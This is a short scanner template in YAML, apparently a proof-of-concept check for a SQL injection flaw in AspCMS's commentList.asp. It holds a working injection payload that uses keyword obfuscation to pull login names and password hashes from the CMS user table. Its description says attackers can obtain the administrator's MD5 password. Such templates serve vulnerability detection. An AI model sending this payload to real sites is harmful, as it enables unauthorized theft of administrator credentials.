name: AspCMS commentList.asp SQL注入漏洞
manual: true
query: app="ASPCMS"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
      headers:
        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"admin")
expression: r0()
detail:
  author: gobysec@gmail.com
  links:
  - https://gobies.org/
  description: AspCMS commentList.asp 存在SQL注入漏洞，攻击者通过漏洞可以获取管理员md5的密码
  tags: sqli
